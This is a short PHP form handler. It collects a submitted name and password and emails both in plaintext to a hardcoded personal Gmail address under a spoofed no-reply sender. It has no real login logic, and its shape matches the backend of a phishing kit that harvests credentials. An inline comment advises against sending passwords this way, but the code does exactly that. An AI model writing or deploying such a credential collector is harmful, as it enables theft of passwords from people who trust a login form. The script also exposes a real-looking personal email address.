<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $to = "habeebamoo08@gmail.com"; // Replace with your email
    $subject = "New Form Submission";

    // Collect and sanitize inputs
    $name = htmlspecialchars($_POST['name']);
    $password = htmlspecialchars($_POST['password']); // Avoid sending passwords in plaintext in real-world scenarios

    // Prepare email body
    $body = "Name: $name\nPassword: $password";
    $headers = "From: no-reply@example.com";

    // Send email
    if (mail($to, $subject, $body, $headers)) {
        echo "Form submitted successfully!";
    } else {
        echo "Failed to submit the form. Please try again.";
    }
} else {
    echo "Invalid request.";
}
?>